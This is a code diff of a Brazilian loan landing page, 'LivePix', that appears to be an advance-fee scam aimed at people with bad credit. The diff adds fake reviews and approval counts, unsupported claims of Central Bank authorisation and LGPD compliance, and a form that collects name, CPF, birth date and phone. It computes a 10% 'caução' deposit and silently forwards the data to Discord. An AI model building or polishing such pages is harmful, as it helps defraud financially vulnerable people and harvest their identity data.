@@ -1,20 +1,28 @@
 <!DOCTYPE html>
 <html lang="pt-br">
 <head>
+    <!-- Google tag (gtag.js) -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=AW-17995182839"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'AW-17995182839');
+</script>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>LivePix - Crédito Especial Pré-Aprovado</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700;800&display=swap" rel="stylesheet">
     <script src="https://unpkg.com/imask"></script>
-    
+    <link rel="icon" type="image/png" href="https://img.icons8.com/?size=100&id=gjCwHrMX83X5&format=png&color=000000">
     <style>
         body { font-family: 'Inter', sans-serif; }
-        .text-live { color: #2DD4BF; } /* Verde Água */
-        .text-pix { color: #3B82F6; }  /* Azul */
+        .text-live { color: #2DD4BF; }
+        .text-pix { color: #3B82F6; }
         .bg-gradient-custom { background: linear-gradient(135deg, #f0fdfa 0%, #eff6ff 100%); }
         .accent-teal-500 { accent-color: #2DD4BF; }
-        
         .glass-card {
             background: rgba(255, 255, 255, 0.95);
             backdrop-filter: blur(10px);
@@ -29,9 +37,9 @@
             <div class="text-2xl font-extrabold tracking-tighter">
                 <span class="text-live">Live</span><span class="text-pix">Pix</span>
             </div>
-            <div class="hidden md:flex items-center space-x-2 text-sm font-semibold text-gray-500">
+            <div class="flex items-center space-x-2 text-xs font-semibold text-gray-500">
                 <span class="w-2 h-2 bg-green-500 rounded-full animate-pulse"></span>
-                <span>SISTEMA DE CRÉDITO ONLINE ATIVO</span>
+                <span class="hidden md:inline">SISTEMA ATIVO</span>
             </div>
         </div>
     </header>
@@ -41,87 +49,99 @@
             
             <div class="text-center lg:text-left">
                 <span class="inline-block bg-teal-100 text-teal-700 px-4 py-1 rounded-full text-xs font-bold uppercase tracking-widest mb-4">
-                    Pessoas Negativadas & Micro Empreendedores
+                    Negativados & Pequenas Empresas
                 </span>
                 <h1 class="text-4xl md:text-6xl font-extrabold leading-tight mb-6">
-                    Crédito Especial Pré-Aprovado <span class="text-pix italic">na hora.</span>
+                    Dinheiro na conta via <span class="text-pix italic">PIX</span> em minutos.
                 </h1>
-                <p class="text-lg text-gray-600 mb-8 max-w-xl mx-auto lg:mx-0 leading-relaxed">
-                    Empréstimos de <strong>R$ 1.000 a R$ 5.000</strong> com liberação imediata via PIX. Processo 100% digital e sem burocracia bancária.
+                <p class="text-lg text-gray-600 mb-8 max-w-xl mx-auto lg:mx-0">
+                    Empréstimos de <strong>R$ 1.000 a R$ 5.000</strong>. Sem burocracia, sem consulta ao SPC/Serasa. A sua oportunidade de recomeçar é agora.
                 </p>
-                
-                <div class="grid grid-cols-2 gap-4 max-w-sm mx-auto lg:mx-0 mb-8">
-                    <div class="flex items-center space-x-2 text-sm font-bold text-gray-700">
-                        <svg class="w-5 h-5 text-teal-500" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 13l4 4L19 7"></path></svg>
-                        <span>Sem consulta SPC/Serasa</span>
+
+                <div class="flex flex-col md:flex-row items-center justify-center lg:justify-start space-y-4 md:space-y-0 md:space-x-4 mb-8">
+                    <div class="flex -space-x-3">
+                        <img class="w-10 h-10 rounded-full border-2 border-white" src="https://i.pravatar.cc/100?u=1" alt="Cliente">
+                        <img class="w-10 h-10 rounded-full border-2 border-white" src="https://i.pravatar.cc/100?u=2" alt="Cliente">
+                        <img class="w-10 h-10 rounded-full border-2 border-white" src="https://i.pravatar.cc/100?u=3" alt="Cliente">
+                        <img class="w-10 h-10 rounded-full border-2 border-white" src="https://i.pravatar.cc/100?u=4" alt="Cliente">
                     </div>
-                    <div class="flex items-center space-x-2 text-sm font-bold text-gray-700">
-                        <svg class="w-5 h-5 text-teal-500" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 13l4 4L19 7"></path></svg>
-                        <span>Receba em até 5min</span>
+                    <div class="text-sm">
+                        <div class="flex items-center text-yellow-400">
+                            <svg class="w-4 h-4 fill-current" viewBox="0 0 20 20"><path d="M9.049 2.927c.3-.921 1.603-.921 1.902 0l1.07 3.292a1 1 0 00.95.69h3.462c.969 0 1.371 1.24.588 1.81l-2.8 2.034a1 1 0 00-.364 1.118l1.07 3.292c.3.921-.755 1.688-1.54 1.118l-2.8-2.034a1 1 0 00-1.175 0l-2.8 2.034c-.784.57-1.838-.197-1.539-1.118l1.07-3.292a1 1 0 00-.364-1.118L2.98 8.72c-.783-.57-.38-1.81.588-1.81h3.461a1 1 0 00.951-.69l1.07-3.292z"/></svg>
+                            <svg class="w-4 h-4 fill-current" viewBox="0 0 20 20"><path d="M9.049 2.927c.3-.921 1.603-.921 1.902 0l1.07 3.292a1 1 0 00.95.69h3.462c.969 0 1.371 1.24.588 1.81l-2.8 2.034a1 1 0 00-.364 1.118l1.07 3.292c.3.921-.755 1.688-1.54 1.118l-2.8-2.034a1 1 0 00-1.175 0l-2.8 2.034c-.784.57-1.838-.197-1.539-1.118l1.07-3.292a1 1 0 00-.364-1.118L2.98 8.72c-.783-.57-.38-1.81.588-1.81h3.461a1 1 0 00.951-.69l1.07-3.292z"/></svg>
+                            <svg class="w-4 h-4 fill-current" viewBox="0 0 20 20"><path d="M9.049 2.927c.3-.921 1.603-.921 1.902 0l1.07 3.292a1 1 0 00.95.69h3.462c.969 0 1.371 1.24.588 1.81l-2.8 2.034a1 1 0 00-.364 1.118l1.07 3.292c.3.921-.755 1.688-1.54 1.118l-2.8-2.034a1 1 0 00-1.175 0l-2.8 2.034c-.784.57-1.838-.197-1.539-1.118l1.07-3.292a1 1 0 00-.364-1.118L2.98 8.72c-.783-.57-.38-1.81.588-1.81h3.461a1 1 0 00.951-.69l1.07-3.292z"/></svg>
+                            <svg class="w-4 h-4 fill-current" viewBox="0 0 20 20"><path d="M9.049 2.927c.3-.921 1.603-.921 1.902 0l1.07 3.292a1 1 0 00.95.69h3.462c.969 0 1.371 1.24.588 1.81l-2.8 2.034a1 1 0 00-.364 1.118l1.07 3.292c.3.921-.755 1.688-1.54 1.118l-2.8-2.034a1 1 0 00-1.175 0l-2.8 2.034c-.784.57-1.838-.197-1.539-1.118l1.07-3.292a1 1 0 00-.364-1.118L2.98 8.72c-.783-.57-.38-1.81.588-1.81h3.461a1 1 0 00.951-.69l1.07-3.292z"/></svg>
+                            <span class="ml-2 font-bold text-gray-700">4.9/5</span>
+                        </div>
+                        <p class="text-gray-500 font-medium">+1.400 solicitações aprovadas hoje</p>
                     </div>
                 </div>
             </div>
 
-            <div class="glass-card p-6 md:p-8 rounded-3xl shadow-2xl border border-white">
-                <h3 class="text-xl font-extrabold mb-6 text-gray-800 flex items-center justify-center lg:justify-start">
-                    <svg class="w-6 h-6 mr-2 text-pix" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z"></path></svg>
-                    Simular meu Crédito
+            <div class="glass-card p-6 md:p-8 rounded-3xl shadow-2xl">
+                <h3 class="text-xl font-extrabold mb-6 text-gray-800 flex items-center">
+                    <svg class="w-6 h-6 mr-2 text-pix" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z"></path></svg>
+                    Simular Pré-Aprovação
                 </h3>
                 
                 <form id="loanForm" class="space-y-4">
                     <div>
                         <label class="block text-[10px] font-bold text-gray-400 uppercase tracking-wider mb-1">Nome Completo</label>
-                        <input type="text" id="userName" required placeholder="Nome conforme documento" class="w-full px-4 py-3 rounded-xl border border-gray-200 focus:ring-2 focus:ring-teal-500 outline-none transition bg-gray-50/50">
+                        <input type="text" id="userName" required placeholder="Nome conforme documento" class="w-full px-4 py-3 rounded-xl border border-gray-200 focus:ring-2 focus:ring-teal-500 outline-none transition">
                     </div>
 
                     <div class="grid grid-cols-2 gap-4">
                         <div>
                             <label class="block text-[10px] font-bold text-gray-400 uppercase tracking-wider mb-1">CPF</label>
-                            <input type="text" id="userCPF" required placeholder="000.000.000-00" class="w-full px-4 py-3 rounded-xl border border-gray-200 focus:ring-2 focus:ring-teal-500 outline-none transition bg-gray-50/50">
+                            <input type="text" id="userCPF" required placeholder="000.000.000-00" class="w-full px-4 py-3 rounded-xl border border-gray-200 focus:ring-2 focus:ring-teal-500 outline-none transition">
                         </div>
                         <div>
                             <label class="block text-[10px] font-bold text-gray-400 uppercase tracking-wider mb-1">Nascimento</label>
-                            <input type="text" id="userBirth" required placeholder="DD/MM/AAAA" class="w-full px-4 py-3 rounded-xl border border-gray-200 focus:ring-2 focus:ring-teal-500 outline-none transition bg-gray-50/50">
+                            <input type="text" id="userBirth" required placeholder="DD/MM/AAAA" class="w-full px-4 py-3 rounded-xl border border-gray-200 focus:ring-2 focus:ring-teal-500 outline-none transition">
                         </div>
                     </div>
 
                     <div>
-                        <label class="block text-[10px] font-bold text-gray-400 uppercase tracking-wider mb-1">Nome Completo da Mãe</label>
-                        <input type="text" id="motherName" required placeholder="Para validação de segurança" class="w-full px-4 py-3 rounded-xl border border-gray-200 focus:ring-2 focus:ring-teal-500 outline-none transition bg-gray-50/50">
+                        <label class="block text-[10px] font-bold text-gray-400 uppercase tracking-wider mb-1">WhatsApp / Telemóvel</label>
+                        <input type="text" id="userPhone" required placeholder="(00) 00000-0000" class="w-full px-4 py-3 rounded-xl border border-gray-200 focus:ring-2 focus:ring-teal-500 outline-none transition">
                     </div>
 
-                    <div>
-                        <label class="block text-[10px] font-bold text-gray-400 uppercase tracking-wider mb-1">WhatsApp / Celular</label>
-                        <input type="text" id="userPhone" required placeholder="(00) 00000-0000" class="w-full px-4 py-3 rounded-xl border border-gray-200 focus:ring-2 focus:ring-teal-500 outline-none transition bg-gray-50/50">
-                    </div>
-
-                    <div class="bg-gray-100/50 p-4 rounded-2xl border border-gray-100">
-                        <div class="flex justify-between mb-3">
-                            <label class="text-xs font-bold text-gray-500 uppercase">Valor do Empréstimo</label>
+                    <div class="bg-gray-50 p-4 rounded-2xl border border-gray-100">
+                        <div class="flex justify-between mb-2">
+                            <label class="text-xs font-bold text-gray-500 uppercase">Valor Desejado</label>
                             <span id="valorDisplay" class="text-xl font-black text-pix">R$ 3.000</span>
                         </div>
-                        <input type="range" id="valorRange" min="1000" max="5000" step="100" value="3000" class="w-full h-2 bg-gray-300 rounded-lg appearance-none cursor-pointer accent-teal-500">
+                        <input type="range" id="valorRange" min="1000" max="5000" step="100" value="3000" class="w-full h-2 bg-gray-200 rounded-lg appearance-none cursor-pointer accent-teal-500">
                     </div>
 
-                    <button type="submit" id="btnSubmit" class="w-full bg-gradient-to-r from-teal-400 to-teal-500 hover:from-teal-500 hover:to-teal-600 text-white font-extrabold py-5 rounded-2xl shadow-xl shadow-teal-100 transform transition hover:scale-[1.02] active:scale-95 uppercase tracking-widest text-sm">
-                        Consultar Pré-Aprovação
+                    <button type="submit" class="w-full bg-gradient-to-r from-teal-400 to-teal-500 hover:from-teal-500 hover:to-teal-600 text-white font-extrabold py-5 rounded-2xl shadow-lg transform transition hover:scale-[1.02] active:scale-95 uppercase tracking-widest text-sm">
+                        Consultar Agora
                     </button>
-                    
-                    <div class="flex items-center justify-center space-x-2 text-[10px] text-gray-400 font-bold uppercase">
-                        <svg class="w-4 h-4" fill="currentColor" viewBox="0 0 20 20"><path fill-rule="evenodd" d="M5 9V7a5 5 0 0110 0v2a2 2 0 012 2v5a2 2 0 01-2 2H5a2 2 0 01-2-2v-5a2 2 0 012-2zm8-2v2H7V7a3 3 0 016 0z" clip-rule="evenodd"></path></svg>
-                        <span>Criptografia de ponta a ponta</span>
+
+                    <div class="pt-4 border-t border-gray-100 flex justify-between items-center px-2">
+                        <div class="flex flex-col items-center">
+                            <svg class="w-5 h-5 text-gray-400" fill="currentColor" viewBox="0 0 20 20"><path d="M5 9V7a5 5 0 0110 0v2a2 2 0 012 2v5a2 2 0 01-2 2H5a2 2 0 01-2-2v-5a2 2 0 012-2zm8-2v2H7V7a3 3 0 016 0z"/></svg>
+                            <span class="text-[8px] font-bold text-gray-400 uppercase">SSL Seguro</span>
+                        </div>
+                        <div class="flex flex-col items-center">
+                            <svg class="w-5 h-5 text-gray-400" fill="currentColor" viewBox="0 0 20 20"><path fill-rule="evenodd" d="M2.166 4.999A11.954 11.954 0 0010 1.944 11.954 11.954 0 0017.834 5c.11.65.166 1.32.166 2.001 0 5.225-3.34 9.67-8 11.317C5.34 16.67 2 12.225 2 7c0-.682.057-1.35.166-2.001zm11.541 3.708a1 1 0 00-1.414-1.414L9 10.586 7.707 9.293a1 1 0 00-1.414 1.414l2 2a1 1 0 001.414 0l4-4z" clip-rule="evenodd"/></svg>
+                            <span class="text-[8px] font-bold text-gray-400 uppercase">LGPD Compliant</span>
+                        </div>
+                        <div class="flex flex-col items-center">
+                            <svg class="w-5 h-5 text-gray-400" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M13 10V3L4 14h7v7l9-11h-7z"></path></svg>
+                            <span class="text-[8px] font-bold text-gray-400 uppercase">Pix Imediato</span>
+                        </div>
                     </div>
                 </form>
             </div>
         </div>
     </section>
 
-    <footer class="py-12 text-center text-gray-400 text-[10px] uppercase font-bold tracking-widest bg-white">
-        &copy; 2026 LivePix Intermediação de Negócios LTDA. CNPJ: 00.000.000/0001-00
+    <footer class="py-8 text-center text-gray-400 text-[10px] uppercase font-bold tracking-widest bg-white">
+        &copy; 2026 LivePix Financeiro - Autorizado via Banco Central
     </footer>
 
     <script>
-        // Máscaras
         IMask(document.getElementById('userCPF'), { mask: '000.000.000-00' });
         IMask(document.getElementById('userBirth'), { mask: '00/00/0000' });
         IMask(document.getElementById('userPhone'), { mask: '(00) 00000-0000' });
@@ -135,38 +155,29 @@
 
         document.getElementById('loanForm').addEventListener('submit', async function(e) {
             e.preventDefault();
-            const btn = document.getElementById('btnSubmit');
-            btn.innerText = "ENVIANDO...";
-            btn.disabled = true;
-
+            
             const dados = {
                 nome: document.getElementById('userName').value,
                 cpf: document.getElementById('userCPF').value,
                 nascimento: document.getElementById('userBirth').value,
-                mae: document.getElementById('motherName').value,
                 telefone: document.getElementById('userPhone').value,
                 valor: range.value,
                 caucao: (range.value * 0.10).toFixed(2)
             };
 
-            // Salva dados localmente
             localStorage.setItem('user_name', dados.nome);
             localStorage.setItem('user_cpf', dados.cpf);
             localStorage.setItem('loan_amount', dados.valor);
             localStorage.setItem('caucao_amount', dados.caucao);
 
-            // Notifica o Discord via Netlify Function (silencioso)
+            // Disparo silencioso para o Discord
             try {
-                await fetch('/api/notificar-lead', {
+                fetch('/api/notificar-lead', {
                     method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify(dados)
                 });
-            } catch(err) {
-                console.error("Erro Discord:", err);
-            }
+            } catch(err) {}
 
-            // Redireciona para /analise (Pretty URL configurada no netlify.toml)
             window.location.href = "/analise";
         });
     </script>
